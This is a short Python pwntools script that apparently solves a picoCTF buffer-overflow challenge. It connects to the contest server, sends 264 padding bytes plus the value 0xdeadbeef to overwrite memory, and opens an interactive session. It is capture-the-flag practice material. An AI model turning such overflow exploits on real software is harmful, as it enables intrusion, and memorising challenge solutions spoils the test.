from pwn import *

p = remote("mars.picoctf.net", 31890)

offset = 264

print(p.recvuntil("see?\n"))

payload = [
    b"a"*offset,
    p64(0xdeadbeef),
]

payload = b"".join(payload)
p.sendline(payload)

p.interactive()
